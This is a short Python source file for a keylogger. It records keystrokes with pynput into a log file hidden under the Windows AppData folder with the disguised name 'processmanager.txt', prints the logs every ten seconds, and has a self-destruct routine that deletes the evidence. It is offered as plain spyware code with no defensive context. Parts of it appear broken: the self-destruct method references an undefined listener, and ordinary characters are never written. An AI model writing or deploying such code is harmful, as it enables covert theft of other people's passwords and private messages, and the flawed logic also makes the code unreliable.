import os
import threading
import time
from sys import platform
from pynput.keyboard import Listener


class Keylogger:
    keys = []
    count = 0
    flag = 0
    path = (
        os.path.join(os.environ.get("appdata", ""), "processmanager.txt")
        if platform == "win32"
        else "processmanager.txt"
    )

    def on_press(self, key):
        self.keys.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            self.write_file(self.keys)
            self.keys = []

    def read_logs(self):
        with open(self.path, "rt") as f:
            return f.read()

    def write_file(self, keys):
        with open(self.path, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if "backspace" in k:
                    f.write(" [BACKSPACE] ")
                elif "enter" in k:
                    f.write("\n")
                elif "shift" in k:
                    f.write(" [SHIFT] ")
                elif "space" in k:
                    f.write(" ")
                elif "caps_lock" in k:
                    f.write(" [CAPS_LOCK] ")
                elif "Key" in k:
                    f.write(k)

    def self_destruct(self):
        self.flag = 1
        listener.stop()
        os.remove(self.path)

    def start(self):
        with Listener(on_press=self.on_press) as listener:
            listener.join()


if __name__ == "__main__":
    keylog = Keylogger()
    t = threading.Thread(target=keylog.start)
    t.start()
    while not keylog.flag:
        time.sleep(10)
        logs = keylog.read_logs()
        print(logs)
    t.join()
